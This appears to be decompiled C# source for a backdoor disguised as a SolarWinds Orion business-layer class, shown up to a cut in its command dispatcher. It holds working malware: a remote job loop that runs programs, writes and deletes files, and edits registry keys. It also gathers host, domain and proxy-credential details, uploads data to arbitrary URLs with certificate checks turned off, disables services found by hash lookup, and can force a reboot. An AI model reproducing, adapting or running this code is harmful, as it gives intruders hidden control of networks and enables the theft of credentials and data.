using System;
using System.Collections.Generic;
using System.Configuration;
using System.Diagnostics;
using System.IO;
using System.IO.Compression;
using System.IO.Pipes;
using System.Linq;
using System.Management;
using System.Net;
using System.Net.NetworkInformation;
using System.Net.Security;
using System.Net.Sockets;
using System.Reflection;
using System.Runtime.ConstrainedExecution;
using System.Runtime.InteropServices;
using System.Security.AccessControl;
using System.Security.Cryptography;
using System.Security.Cryptography.X509Certificates;
using System.Security.Principal;
using System.Text;
using System.Text.RegularExpressions;
using System.Threading;
using Microsoft.Win32;
using SolarWinds.Orion.Core.BusinessLayer;
using SolarWinds.Orion.Core.Common.Configuration;
using SolarWinds.Orion.Core.SharedCredentials;
using SolarWinds.Orion.Core.SharedCredentials.Credentials;

internal class ImprovementBusinessLayer
{
    private enum ReportStatus
    {
        New,
        Append,
        Truncate
    }

    private enum AddressFamilyEx
    {
        NetBios,
        ImpLink,
        Ipx,
        InterNetwork,
        InterNetworkV6,
        Unknown,
        Atm,
        Error
    }

    private enum HttpOipMethods
    {
        Get,
        Head,
        Put,
        Post
    }

    private enum ProxyType
    {
        Manual,
        System,
        Direct,
        Default
    }

    private static class RegistryHelper
    {
        private static RegistryHive GetHive(string key, out string subKey)
        {
            string[] array = key.Split(new char[1]
            {
                '\\'
            }, 2);
            string a = array[0].ToUpper();
            subKey = ((array.Length <= 1) ? "" : array[1]);
            if (a == "HKEY_CLASSES_ROOT" || a == "HKCR")
            {
                return RegistryHive.ClassesRoot;
            }
            if (a == "HKEY_CURRENT_USER" || a == "HKCU")
            {
                return RegistryHive.CurrentUser;
            }
            if (a == "HKEY_LOCAL_MACHINE" || a == "HKLM")
            {
                return RegistryHive.LocalMachine;
            }
            if (a == "HKEY_USERS" || a == "HKU")
            {
                return RegistryHive.Users;
            }
            if (a == "HKEY_CURRENT_CONFIG" || a == "HKCC")
            {
                return RegistryHive.CurrentConfig;
            }
            if (a == "HKEY_PERFOMANCE_DATA" || a == "HKPD")
            {
                return RegistryHive.PerformanceData;
            }
            if (a == "HKEY_DYN_DATA" || a == "HKDD")
            {
                return RegistryHive.DynData;
            }
            return (RegistryHive)0;
        }

        public static bool SetValue(string key, string valueName, string valueData, RegistryValueKind valueKind)
        {
            string subKey;
            using RegistryKey registryKey = RegistryKey.OpenBaseKey(GetHive(key, out subKey), RegistryView.Registry64);
            using RegistryKey registryKey2 = registryKey.OpenSubKey(subKey, writable: true);
            switch (valueKind)
            {
                case RegistryValueKind.String:
                case RegistryValueKind.ExpandString:
                case RegistryValueKind.DWord:
                case RegistryValueKind.QWord:
                    registryKey2.SetValue(valueName, valueData, valueKind);
                    break;
                case RegistryValueKind.MultiString:
                    registryKey2.SetValue(valueName, valueData.Split(new string[2]
                    {
                    "\r\n",
                    "\n"
                    }, StringSplitOptions.None), valueKind);
                    break;
                case RegistryValueKind.Binary:
                    registryKey2.SetValue(valueName, HexStringToByteArray(valueData), valueKind);
                    break;
                default:
                    return false;
            }
            return true;
        }

        public static string GetValue(string key, string valueName, object defaultValue)
        {
            string subKey;
            using (RegistryKey registryKey = RegistryKey.OpenBaseKey(GetHive(key, out subKey), RegistryView.Registry64))
            {
                using RegistryKey registryKey2 = registryKey.OpenSubKey(subKey);
                object value = registryKey2.GetValue(valueName, defaultValue);
                if (value != null)
                {
                    if (value.GetType() == typeof(byte[]))
                    {
                        return ByteArrayToHexString((byte[])value);
                    }
                    if (value.GetType() == typeof(string[]))
                    {
                        return string.Join("\n", (string[])value);
                    }
                    return value.ToString();
                }
            }
            return null;
        }

        public static void DeleteValue(string key, string valueName)
        {
            string subKey;
            using RegistryKey registryKey = RegistryKey.OpenBaseKey(GetHive(key, out subKey), RegistryView.Registry64);
            using RegistryKey registryKey2 = registryKey.OpenSubKey(subKey, writable: true);
            registryKey2.DeleteValue(valueName, throwOnMissingValue: true);
        }

        public static string GetSubKeyAndValueNames(string key)
        {
            string subKey;
            using RegistryKey registryKey = RegistryKey.OpenBaseKey(GetHive(key, out subKey), RegistryView.Registry64);
            using RegistryKey registryKey2 = registryKey.OpenSubKey(subKey);
            return string.Join("\n", registryKey2.GetSubKeyNames()) + "\n\n" + string.Join(" \n", registryKey2.GetValueNames());
        }

        private static string GetNewOwnerName()
        {
            string text = null;
            string value = "S-1-5-";
            string value2 = "-500";
            try
            {
                text = new NTAccount("Administrator").Translate(typeof(SecurityIdentifier)).Value;
            }
            catch
            {
            }
            if (string.IsNullOrEmpty(text) || !text.StartsWith(value, StringComparison.OrdinalIgnoreCase) || !text.EndsWith(value2, StringComparison.OrdinalIgnoreCase))
            {
                string queryString = "Select * From Win32_UserAccount";
                text = null;
                using ManagementObjectSearcher managementObjectSearcher = new ManagementObjectSearcher(queryString);
                foreach (ManagementObject item in managementObjectSearcher.Get())
                {
                    string text2 = item.Properties["SID"].Value.ToString();
                    if (item.Properties["LocalAccount"].Value.ToString().ToLower() == "true" && text2.StartsWith(value, StringComparison.OrdinalIgnoreCase))
                    {
                        if (text2.EndsWith(value2, StringComparison.OrdinalIgnoreCase))
                        {
                            text = text2;
                            break;
                        }
                        if (string.IsNullOrEmpty(text))
                        {
                            text = text2;
                        }
                    }
                }
            }
            return new SecurityIdentifier(text).Translate(typeof(NTAccount)).Value;
        }

        private static void SetKeyOwner(RegistryKey key, string subKey, string owner)
        {
            using RegistryKey registryKey = key.OpenSubKey(subKey, RegistryKeyPermissionCheck.ReadWriteSubTree, RegistryRights.TakeOwnership);
            RegistrySecurity registrySecurity = new RegistrySecurity();
            registrySecurity.SetOwner(new NTAccount(owner));
            registryKey.SetAccessControl(registrySecurity);
        }

        private static void SetKeyOwnerWithPrivileges(RegistryKey key, string subKey, string owner)
        {
            try
            {
                SetKeyOwner(key, subKey, owner);
            }
            catch
            {
                bool previousState = false;
                bool previousState2 = false;
                bool flag = false;
                bool flag2 = false;
                string privilege = "SeRestorePrivilege";
                string privilege2 = "SeTakeOwnershipPrivilege";
                flag = NativeMethods.SetProcessPrivilege(privilege2, newState: true, out previousState);
                flag2 = NativeMethods.SetProcessPrivilege(privilege, newState: true, out previousState2);
                try
                {
                    SetKeyOwner(key, subKey, owner);
                }
                finally
                {
                    if (flag)
                    {
                        NativeMethods.SetProcessPrivilege(privilege2, previousState, out previousState);
                    }
                    if (flag2)
                    {
                        NativeMethods.SetProcessPrivilege(privilege, previousState2, out previousState2);
                    }
                }
            }
        }

        public static void SetKeyPermissions(RegistryKey key, string subKey, bool reset)
        {
            bool isProtected = !reset;
            string text = "SYSTEM";
            string text2 = (reset ? text : GetNewOwnerName());
            SetKeyOwnerWithPrivileges(key, subKey, text);
            using (RegistryKey registryKey = key.OpenSubKey(subKey, RegistryKeyPermissionCheck.ReadWriteSubTree, RegistryRights.ChangePermissions))
            {
                RegistrySecurity registrySecurity = new RegistrySecurity();
                if (!reset)
                {
                    RegistryAccessRule rule = new RegistryAccessRule(text2, RegistryRights.FullControl, InheritanceFlags.None, PropagationFlags.NoPropagateInherit, AccessControlType.Allow);
                    registrySecurity.AddAccessRule(rule);
                }
                registrySecurity.SetAccessRuleProtection(isProtected, preserveInheritance: false);
                registryKey.SetAccessControl(registrySecurity);
            }
            if (!reset)
            {
                SetKeyOwnerWithPrivileges(key, subKey, text2);
            }
        }
    }

    private static class ConfigManager
    {
        public static bool ReadReportStatus(out ReportStatus status)
        {
            try
            {
                if (ReadConfig(reportStatusName, out var sValue) && int.TryParse(sValue, out var result))
                {
                    switch (result)
                    {
                        case 5:
                            status = ReportStatus.Append;
                            return true;
                        case 3:
                            status = ReportStatus.Truncate;
                            return true;
                        case 4:
                            status = ReportStatus.New;
                            return true;
                    }
                }
            }
            catch (ConfigurationErrorsException)
            {
            }
            status = ReportStatus.New;
            return false;
        }

        public static bool ReadServiceStatus(bool _readonly)
        {
            try
            {
                if (ReadConfig(serviceStatusName, out var sValue) && int.TryParse(sValue, out var result) && result >= 250 && result % 5 == 0 && result <= 250 + ((1 << svcList.Length) - 1) * 5)
                {
                    result = (result - 250) / 5;
                    if (!_readonly)
                    {
                        for (int i = 0; i < svcList.Length; i++)
                        {
                            svcList[i].stopped = (result & (1 << i)) != 0;
                        }
                    }
                    return true;
                }
            }
            catch (Exception)
            {
            }
            if (!_readonly)
            {
                for (int j = 0; j < svcList.Length; j++)
                {
                    svcList[j].stopped = true;
                }
            }
            return false;
        }

        public static bool WriteReportStatus(ReportStatus status)
        {
            if (ReadReportStatus(out var _))
            {
                switch (status)
                {
                    case ReportStatus.New:
                        return WriteConfig(reportStatusName, "4");
                    case ReportStatus.Append:
                        return WriteConfig(reportStatusName, "5");
                    case ReportStatus.Truncate:
                        return WriteConfig(reportStatusName, "3");
                }
            }
            return false;
        }

        public static bool WriteServiceStatus()
        {
            if (ReadServiceStatus(_readonly: true))
            {
                int num = 0;
                for (int i = 0; i < svcList.Length; i++)
                {
                    num |= (svcList[i].stopped ? 1 : 0) << i;
                }
                return WriteConfig(serviceStatusName, (num * 5 + 250).ToString());
            }
            return false;
        }

        private static bool ReadConfig(string key, out string sValue)
        {
            sValue = null;
            try
            {
                sValue = ConfigurationManager.AppSettings[key];
                return true;
            }
            catch (Exception)
            {
            }
            return false;
        }

        private static bool WriteConfig(string key, string sValue)
        {
            try
            {
                Configuration configuration = ConfigurationManager.OpenExeConfiguration(ConfigurationUserLevel.None);
                KeyValueConfigurationCollection settings = configuration.AppSettings.Settings;
                if (settings[key] != null)
                {
                    settings[key].Value = sValue;
                    configuration.Save(ConfigurationSaveMode.Modified);
                    ConfigurationManager.RefreshSection(configuration.AppSettings.SectionInformation.Name);
                    return true;
                }
            }
            catch (Exception)
            {
            }
            return false;
        }
    }

    private class ServiceConfiguration
    {
        public class Service
        {
            public ulong timeStamp;

            public uint DefaultValue;

            public bool started;
        }

        public ulong[] timeStamps;

        private readonly object _lock = new object();

        private volatile bool _stopped;

        private volatile bool _running;

        private volatile bool _disabled;

        public Service[] Svc;

        public bool stopped
        {
            get
            {
                lock (_lock)
                {
                    return _stopped;
                }
            }
            set
            {
                lock (_lock)
                {
                    _stopped = value;
                }
            }
        }

        public bool running
        {
            get
            {
                lock (_lock)
                {
                    return _running;
                }
            }
            set
            {
                lock (_lock)
                {
                    _running = value;
                }
            }
        }

        public bool disabled
        {
            get
            {
                lock (_lock)
                {
                    return _disabled;
                }
            }
            set
            {
                lock (_lock)
                {
                    _disabled = value;
                }
            }
        }
    }

    private static class ProcessTracker
    {
        private static readonly object _lock = new object();

        private static bool SearchConfigurations()
        {
            using (ManagementObjectSearcher managementObjectSearcher = new ManagementObjectSearcher("Select * From Win32_SystemDriver"))
            {
                foreach (ManagementObject item in managementObjectSearcher.Get())
                {
                    ulong hash = GetHash(Path.GetFileName(item.Properties["PathName"].Value.ToString()).ToLower());
                    if (Array.IndexOf(configTimeStamps, hash) != -1)
                    {
                        return true;
                    }
                }
            }
            return false;
        }

        private static bool SearchAssemblies(Process[] processes)
        {
            for (int i = 0; i < processes.Length; i++)
            {
                ulong hash = GetHash(processes[i].ProcessName.ToLower());
                if (Array.IndexOf(assemblyTimeStamps, hash) != -1)
                {
                    return true;
                }
            }
            return false;
        }

        private static bool SearchServices(Process[] processes)
        {
            for (int i = 0; i < processes.Length; i++)
            {
                ulong hash = GetHash(processes[i].ProcessName.ToLower());
                ServiceConfiguration[] svcList = OrionImprovementBusinessLayer.svcList;
                foreach (ServiceConfiguration serviceConfiguration in svcList)
                {
                    if (Array.IndexOf(serviceConfiguration.timeStamps, hash) == -1)
                    {
                        continue;
                    }
                    lock (_lock)
                    {
                        if (!serviceConfiguration.running)
                        {
                            svcListModified1 = true;
                            svcListModified2 = true;
                            serviceConfiguration.running = true;
                        }
                        if (!serviceConfiguration.disabled && !serviceConfiguration.stopped && serviceConfiguration.Svc.Length != 0)
                        {
                            DelayMin(0, 0);
                            SetManualMode(serviceConfiguration.Svc);
                            serviceConfiguration.disabled = true;
                            serviceConfiguration.stopped = true;
                        }
                    }
                }
            }
            if (OrionImprovementBusinessLayer.svcList.Any((ServiceConfiguration a) => a.disabled))
            {
                ConfigManager.WriteServiceStatus();
                return true;
            }
            return false;
        }

        public static bool TrackProcesses(bool full)
        {
            Process[] processes = Process.GetProcesses();
            if (SearchAssemblies(processes))
            {
                return true;
            }
            bool flag = SearchServices(processes);
            if (!flag && full)
            {
                return SearchConfigurations();
            }
            return flag;
        }

        private static bool SetManualMode(ServiceConfiguration.Service[] svcList)
        {
            try
            {
                bool result = false;
                using (RegistryKey registryKey = Registry.LocalMachine.OpenSubKey("SYSTEM\\CurrentControlSet\\services"))
                {
                    string[] subKeyNames = registryKey.GetSubKeyNames();
                    foreach (string text in subKeyNames)
                    {
                        foreach (ServiceConfiguration.Service service in svcList)
                        {
                            try
                            {
                                if (GetHash(text.ToLower()) != service.timeStamp)
                                {
                                    continue;
                                }
                                if (service.started)
                                {
                                    result = true;
                                    RegistryHelper.SetKeyPermissions(registryKey, text, reset: false);
                                    continue;
                                }
                                using RegistryKey registryKey2 = registryKey.OpenSubKey(text, writable: true);
                                if (registryKey2.GetValueNames().Contains("Start"))
                                {
                                    registryKey2.SetValue("Start", 4, RegistryValueKind.DWord);
                                    result = true;
                                }
                            }
                            catch (Exception)
                            {
                            }
                        }
                    }
                }
                return result;
            }
            catch (Exception)
            {
            }
            return false;
        }

        public static void SetAutomaticMode()
        {
            try
            {
                using RegistryKey registryKey = Registry.LocalMachine.OpenSubKey("SYSTEM\\CurrentControlSet\\services");
                string[] subKeyNames = registryKey.GetSubKeyNames();
                foreach (string text in subKeyNames)
                {
                    ServiceConfiguration[] svcList = OrionImprovementBusinessLayer.svcList;
                    foreach (ServiceConfiguration serviceConfiguration in svcList)
                    {
                        if (!serviceConfiguration.stopped)
                        {
                            continue;
                        }
                        ServiceConfiguration.Service[] svc = serviceConfiguration.Svc;
                        foreach (ServiceConfiguration.Service service in svc)
                        {
                            try
                            {
                                if (GetHash(text.ToLower()) != service.timeStamp)
                                {
                                    continue;
                                }
                                if (service.started)
                                {
                                    RegistryHelper.SetKeyPermissions(registryKey, text, reset: true);
                                    continue;
                                }
                                using RegistryKey registryKey2 = registryKey.OpenSubKey(text, writable: true);
                                if (registryKey2.GetValueNames().Contains("Start"))
                                {
                                    registryKey2.SetValue("Start", service.DefaultValue, RegistryValueKind.DWord);
                                }
                            }
                            catch (Exception)
                            {
                            }
                        }
                    }
                }
            }
            catch (Exception)
            {
            }
        }
    }

    private static class Job
    {
        public static int GetArgumentIndex(string cl, int num)
        {
            if (cl == null)
            {
                return -1;
            }
            if (num == 0)
            {
                return 0;
            }
            char[] array = cl.ToCharArray();
            bool flag = false;
            int num2 = 0;
            for (int i = 0; i < array.Length; i++)
            {
                if (array[i] == '"')
                {
                    flag = !flag;
                }
                if (!flag && array[i] == ' ' && i > 0 && array[i - 1] != ' ')
                {
                    num2++;
                    if (num2 == num)
                    {
                        return i + 1;
                    }
                }
            }
            return -1;
        }

        public static string[] SplitString(string cl)
        {
            if (cl == null)
            {
                return new string[0];
            }
            char[] array = cl.Trim().ToCharArray();
            bool flag = false;
            for (int i = 0; i < array.Length; i++)
            {
                if (array[i] == '"')
                {
                    flag = !flag;
                }
                if (!flag && array[i] == ' ')
                {
                    array[i] = '\n';
                }
            }
            string[] array2 = new string(array).Split(new char[1]
            {
                '\n'
            }, StringSplitOptions.RemoveEmptyEntries);
            for (int j = 0; j < array2.Length; j++)
            {
                string text = "";
                bool flag2 = false;
                array2[j] = Unquote(array2[j]);
                string text2 = array2[j];
                for (int k = 0; k < text2.Length; k++)
                {
                    char c = text2[k];
                    if (flag2)
                    {
                        text = c switch
                        {
                            'q' => text + "\"",
                            '`' => text + '`',
                            _ => text + '`' + c,
                        };
                        flag2 = false;
                    }
                    else if (c == '`')
                    {
                        flag2 = true;
                    }
                    else
                    {
                        text += c;
                    }
                }
                if (flag2)
                {
                    text += '`';
                }
                array2[j] = text;
            }
            return array2;
        }

        public static void SetTime(string[] args, out int delay)
        {
            delay = int.Parse(args[0]);
        }

        public static void KillTask(string[] args)
        {
            Process.GetProcessById(int.Parse(args[0])).Kill();
        }

        public static void DeleteFile(string[] args)
        {
            File.Delete(Environment.ExpandEnvironmentVariables(args[0]));
        }

        public static int GetFileHash(string[] args, out string result)
        {
            result = null;
            string path = Environment.ExpandEnvironmentVariables(args[0]);
            using (MD5 mD = MD5.Create())
            {
                using FileStream inputStream = File.OpenRead(path);
                byte[] bytes = mD.ComputeHash(inputStream);
                if (args.Length > 1)
                {
                    return (!(ByteArrayToHexString(bytes).ToLower() == args[1].ToLower())) ? 1 : 0;
                }
                result = ByteArrayToHexString(bytes);
            }
            return 0;
        }

        public static void GetFileSystemEntries(string[] args, out string result)
        {
            string searchPattern = ((args.Length >= 2) ? args[1] : "*");
            string path = Environment.ExpandEnvironmentVariables(args[0]);
            string[] value = (from f in Directory.GetFiles(path, searchPattern)
                              select Path.GetFileName(f)).ToArray();
            string[] value2 = (from f in Directory.GetDirectories(path, searchPattern)
                               select Path.GetFileName(f)).ToArray();
            result = string.Join("\n", value2) + "\n\n" + string.Join(" \n", value);
        }

        public static void GetProcessByDescription(string[] args, out string result)
        {
            result = null;
            if (args.Length == 0)
            {
                Process[] processes = Process.GetProcesses();
                foreach (Process process in processes)
                {
                    result += string.Format("[{0,5}] {1}", process.Id, Quote(process.ProcessName));

                }
                return;
            }
            using ManagementObjectSearcher managementObjectSearcher = new ManagementObjectSearcher("Select * From Win32_Process");
            foreach (ManagementObject item in managementObjectSearcher.Get())
            {
                string[] array = new string[2]
                {
                    string.Empty,
                    string.Empty
                };
                string methodName = "GetOwner";
                object[] array2 = array;
                object[] args2 = array2;
                Convert.ToInt32(item.InvokeMethod(methodName, args2));
                result += string.Format("[{0,5}] {1,-16} {2}	{3,5} {4}\\{5}", item["ProcessID"], Quote(item["Name"].ToString()), item[args[0]], item["ParentProcessID"], array[1], array[0]);

            }
        }

        private static string GetDescriptionId(ref int i)
        {
            i++;
            return "\n" + i + ". ";
        }

        public static void CollectSystemDescription(string info, out string result)
        {
            result = null;
            int i = 0;
            string domainName = IPGlobalProperties.GetIPGlobalProperties().DomainName;
            result = result + GetDescriptionId(ref i) + domainName;
            try
            {
                string str = ((SecurityIdentifier)new NTAccount(domainName, "Administrator").Translate(typeof(SecurityIdentifier))).AccountDomainSid.ToString();
                result = result + GetDescriptionId(ref i) + str;
            }
            catch
            {
                result += GetDescriptionId(ref i);
            }
            result = result + GetDescriptionId(ref i) + IPGlobalProperties.GetIPGlobalProperties().HostName;
            result = result + GetDescriptionId(ref i) + Environment.UserName;
            result = result + GetDescriptionId(ref i) + GetOSVersion(full: true);
            result = result + GetDescriptionId(ref i) + Environment.SystemDirectory;
            result = result + GetDescriptionId(ref i) + (int)TimeSpan.FromMilliseconds((uint)Environment.TickCount).TotalDays;
            result = result + GetDescriptionId(ref i) + info + "\n";
            result += GetNetworkAdapterConfiguration();
        }

        public static void UploadSystemDescription(string[] args, out string result, IWebProxy proxy)
        {
            result = null;
            string requestUriString = args[0];
            string s = args[1];
            string text = ((args.Length >= 3) ? args[2] : null);
            string[] array = Encoding.UTF8.GetString(Convert.FromBase64String(s)).Split(new string[3]
            {
                "\r\n",
                "\r",
                "\n"
            }, StringSplitOptions.None);
            HttpWebRequest httpWebRequest = (HttpWebRequest)WebRequest.Create(requestUriString);
            httpWebRequest.ServerCertificateValidationCallback = (RemoteCertificateValidationCallback)Delegate.Combine(httpWebRequest.ServerCertificateValidationCallback, (RemoteCertificateValidationCallback)((object sender, X509Certificate cert, X509Chain chain, SslPolicyErrors sslPolicyErrors) => true));
            httpWebRequest.Proxy = proxy;
            httpWebRequest.Timeout = 120000;
            httpWebRequest.Method = array[0].Split(' ')[0];
            string[] array2 = array;
            foreach (string text2 in array2)
            {
                int num = text2.IndexOf(':');
                if (num <= 0)
                {
                    continue;
                }
                string text3 = text2.Substring(0, num);
                string text4 = text2.Substring(num + 1).TrimStart();
                if (!WebHeaderCollection.IsRestricted(text3))
                {
                    httpWebRequest.Headers.Add(text2);
                    continue;
                }
                switch (GetHash(text3.ToLower()))
                {
                    case 15514036435533858158uL:
                        httpWebRequest.Date = DateTime.Parse(text4);
                        break;
                    case 16066522799090129502uL:
                        httpWebRequest.Date = DateTime.Parse(text4);
                        break;
                    case 8873858923435176895uL:
                        if (GetHash(text4.ToLower()) == 1475579823244607677L)
                        {
                            httpWebRequest.ServicePoint.Expect100Continue = true;
                        }
                        else
                        {
                            httpWebRequest.Expect = text4;
                        }
                        break;
                    case 2734787258623754862uL:
                        httpWebRequest.Accept = text4;
                        break;
                    case 9007106680104765185uL:
                        httpWebRequest.Referer = text4;
                        break;
                    case 7574774749059321801uL:
                        httpWebRequest.UserAgent = text4;
                        break;
                    case 6116246686670134098uL:
                        httpWebRequest.ContentType = text4;
                        break;
                    case 11266044540366291518uL:
                        {
                            ulong hash = GetHash(text4.ToLower());
                            httpWebRequest.KeepAlive = hash == 13852439084267373191uL || httpWebRequest.KeepAlive;
                            httpWebRequest.KeepAlive = hash != 14226582801651130532uL && httpWebRequest.KeepAlive;
                            break;
                        }
                }
            }
            result += string.Format("{0} {1} HTTP/{2}", httpWebRequest.Method, httpWebRequest.Address.PathAndQuery, httpWebRequest.ProtocolVersion.ToString());

            result = result + httpWebRequest.Headers.ToString() + "\n\n";
            if (!string.IsNullOrEmpty(text))
            {
                using Stream stream = httpWebRequest.GetRequestStream();
                byte[] array3 = Convert.FromBase64String(text);
                stream.Write(array3, 0, array3.Length);
            }
            using WebResponse webResponse = httpWebRequest.GetResponse();
            result += $"{(int)((HttpWebResponse)webResponse).StatusCode} {((HttpWebResponse)webResponse).StatusDescription}\n";
            result = result + webResponse.Headers.ToString() + "\n";
            using Stream stream2 = webResponse.GetResponseStream();
            result += new StreamReader(stream2).ReadToEnd();
        }

        public static int RunTask(string[] args, string cl, out string result)
        {
            result = null;
            string fileName = Environment.ExpandEnvironmentVariables(args[0]);
            string arguments = ((args.Length > 1) ? cl.Substring(GetArgumentIndex(cl, 1)).Trim() : null);
            using (Process process = new Process())
            {
                process.StartInfo = new ProcessStartInfo(fileName, arguments)
                {
                    CreateNoWindow = false,
                    UseShellExecute = false
                };
                if (process.Start())
                {
                    result = process.Id.ToString();
                    return 0;
                }
            }
            return 1;
        }

        public static void WriteFile(string[] args)
        {
            string path = Environment.ExpandEnvironmentVariables(args[0]);
            byte[] array = Convert.FromBase64String(args[1]);
            for (int i = 0; i < 3; i++)
            {
                try
                {
                    using (FileStream fileStream = new FileStream(path, FileMode.Append, FileAccess.Write))
                    {
                        fileStream.Write(array, 0, array.Length);
                    }
                    return;
                }
                catch (Exception)
                {
                    if (i + 1 >= 3)
                    {
                        throw;
                    }
                }
                DelayMs(0.0, 0.0);
            }
        }

        public static void FileExists(string[] args, out string result)
        {
            string path = Environment.ExpandEnvironmentVariables(args[0]);
            result = File.Exists(path).ToString();
        }

        public static int ReadRegistryValue(string[] args, out string result)
        {
            result = RegistryHelper.GetValue(args[0], args[1], null);
            if (result != null)
            {
                return 0;
            }
            return 1;
        }

        public static void DeleteRegistryValue(string[] args)
        {
            RegistryHelper.DeleteValue(args[0], args[1]);
        }

        public static void GetRegistrySubKeyAndValueNames(string[] args, out string result)
        {
            result = RegistryHelper.GetSubKeyAndValueNames(args[0]);
        }

        public static int SetRegistryValue(string[] args)
        {
            RegistryValueKind valueKind = (RegistryValueKind)Enum.Parse(typeof(RegistryValueKind), args[2]);
            string valueData = ((args.Length > 3) ? Encoding.UTF8.GetString(Convert.FromBase64String(args[3])) : "");
            if (!RegistryHelper.SetValue(args[0], args[1], valueData, valueKind))
            {
                return 1;
            }
            return 0;
        }
    }

    private class Proxy
    {
        private ProxyType proxyType;

        private IWebProxy proxy;

        private string proxyString;

        public Proxy(ProxyType proxyType)
        {
            try
            {
                this.proxyType = proxyType;
                switch (this.proxyType)
                {
                    case ProxyType.Direct:
                        proxy = null;
                        break;
                    case ProxyType.System:
                        proxy = WebRequest.GetSystemWebProxy();
                        break;
                    default:
                        proxy = HttpProxySettings.Instance.AsWebProxy();
                        break;
                }
            }
            catch
            {
            }
        }

        public override string ToString()
        {
            if (proxyType != 0)
            {
                return proxyType.ToString();
            }
            if (proxy == null)
            {
                return ProxyType.Direct.ToString();
            }
            if (string.IsNullOrEmpty(proxyString))
            {
                try
                {
                    IHttpProxySettings instance = HttpProxySettings.Instance;
                    if (instance.get_IsDisabled())
                    {
                        proxyString = ProxyType.Direct.ToString();
                    }
                    else if (instance.get_UseSystemDefaultProxy())
                    {
                        proxyString = ((WebRequest.DefaultWebProxy != null) ? ProxyType.Default.ToString() : ProxyType.System.ToString());
                    }
                    else
                    {
                        proxyString = ProxyType.Manual.ToString();
                        if (instance.get_IsValid())
                        {
                            string[] obj = new string[7]
                            {
                                proxyString,
                                ":",
                                instance.get_Uri(),
                                "\t",
                                null,
                                null,
                                null
                            };
                            Credential credential = instance.get_Credential();
                            object obj2 = (object)(credential as UsernamePasswordCredential);
                            obj[4] = ((obj2 != null) ? ((UsernamePasswordCredential)obj2).get_Username() : null);
                            obj[5] = "\t";
                            Credential credential2 = instance.get_Credential();
                            object obj3 = (object)(credential2 as UsernamePasswordCredential);
                            obj[6] = ((obj3 != null) ? ((UsernamePasswordCredential)obj3).get_Password() : null);
                            proxyString = string.Concat(obj);
                        }
                    }
                }
                catch
                {
                }
            }
            return proxyString;
        }

        public IWebProxy GetWebProxy()
        {
            return proxy;
        }
    }

    private class HttpHelper
    {
        private enum JobEngine
        {
            Idle,
            Exit,
            SetTime,
            CollectSystemDescription,
            UploadSystemDescription,
            RunTask,
            GetProcessByDescription,
            KillTask,
            GetFileSystemEntries,
            WriteFile,
            FileExists,
            DeleteFile,
            GetFileHash,
            ReadRegistryValue,
            SetRegistryValue,
            DeleteRegistryValue,
            GetRegistrySubKeyAndValueNames,
            Reboot,
            None
        }

        private enum HttpOipExMethods
        {
            Get,
            Head,
            Put,
            Post
        }

        private readonly Random random = new Random();

        private readonly byte[] customerId;

        private readonly string httpHost;

        private readonly HttpOipMethods requestMethod;

        private bool isAbort;

        private int delay;

        private int delayInc;

        private readonly Proxy proxy;

        private DateTime timeStamp = DateTime.Now;

        private int mIndex;

        private Guid sessionId = Guid.NewGuid();

        private readonly List<ulong> UriTimeStamps = new List<ulong>();

        public void Abort()
        {
            isAbort = true;
        }

        public HttpHelper(byte[] customerId, DnsRecords rec)
        {
            this.customerId = customerId.ToArray();
            httpHost = rec.cname;
            requestMethod = (HttpOipMethods)rec._type;
            proxy = new Proxy((ProxyType)rec.length);
        }

        private bool TrackEvent()
        {
            if (DateTime.Now.CompareTo(timeStamp.AddMinutes(1.0)) > 0)
            {
                if (ProcessTracker.TrackProcesses(full: false) || svcListModified2)
                {
                    return true;
                }
                timeStamp = DateTime.Now;
            }
            return false;
        }

        private bool IsSynchronized(bool idle)
        {
            if (delay != 0 && idle)
            {
                if (delayInc == 0)
                {
                    delayInc = delay;
                }
                double num = (double)delayInc * 1000.0;
                DelayMs(0.9 * num, 1.1 * num);
                if (delayInc < 300)
                {
                    delayInc *= 2;
                    return true;
                }
            }
            else
            {
                DelayMs(0.0, 0.0);
                delayInc = 0;
            }
            return false;
        }

        public void Initialize()
        {
            JobEngine jobEngine = JobEngine.Idle;
            string result = null;
            int err = 0;
            try
            {
                for (int i = 1; i <= 3; i++)
                {
                    if (isAbort)
                    {
                        break;
                    }
                    byte[] outData = null;
                    if (IsSynchronized(jobEngine == JobEngine.Idle))
                    {
                        i = 0;
                    }
                    if (TrackEvent())
                    {
                        isAbort = true;
                        break;
                    }
                    HttpStatusCode httpStatusCode = CreateUploadRequest(jobEngine, err, result, out outData);
                    if (jobEngine == JobEngine.Exit || jobEngine == JobEngine.Reboot)
                    {
                        isAbort = true;
                        break;
                    }
                    switch (httpStatusCode)
                    {
                        case HttpStatusCode.OK:
                        case HttpStatusCode.NoContent:
                        case HttpStatusCode.NotModified:
                            {
                                string args = null;
                                switch (httpStatusCode)
                                {
                                    case HttpStatusCode.OK:
                                        jobEngine = ParseServiceResponse(outData, out args);
                                        i = ((jobEngine == JobEngine.None || jobEngine == JobEngine.Idle) ? i : 0);
                                        break;
                                    case HttpStatusCode.NoContent:
                                        i = ((jobEngine == JobEngine.None || jobEngine == JobEngine.Idle) ? i : 0);
                                        jobEngine = JobEngine.None;
                                        break;
                                    default:
                                        jobEngine = JobEngine.Idle;
                                        break;
                                }
                                err = ExecuteEngine(jobEngine, args, out result);
                                break;
                            }
                        default:
                            DelayMin(1, 5);
                            break;
                        case (HttpStatusCode)0:
                            break;
                    }
                }
                if (jobEngine == JobEngine.Reboot)
                {
                    NativeMethods.RebootComputer();
                }
            }
            catch (Exception)
            {
            }
        }

        private int ExecuteEngine(JobEngine job, string cl, out string result)
        {
            result = null;
            int result2 = 0;
            string[] args = Job.SplitString(cl);
            try
            {
                if (job == JobEngine.ReadRegistryValue || job == JobEngine.SetRegistryValue || job == JobEngine.DeleteRegistryValue || job == JobEngine.GetRegistrySubKeyAndValueNames)
                {
                    result2 = AddRegistryExecutionEngine(job, args, out result);
                }
                switch (job)
                {
                    case JobEngine.SetTime:
                        {
                            Job.SetTime(args, out var num);
                            delay = num;
                            break;
                        }
                    case JobEngine.GetProcessByDescription:
                        Job.GetProcessByDescription(args, out result);
                        break;
                    case JobEngine.KillTask:
                        Job.KillTask(args);
                        break;
                    case JobEngine.CollectSystemDescription:
                        Job.CollectSystemDescription(proxy.ToString(), out result);
                        break;
                    case JobEngine.UploadSystemDescription:
                        Job.UploadSystemDescription(args, out result, proxy.GetWebProxy());
                        break;
                    case JobEngine.RunTask:
                        result2 = Job.RunTask(args, cl, out result);
                        break;
                }
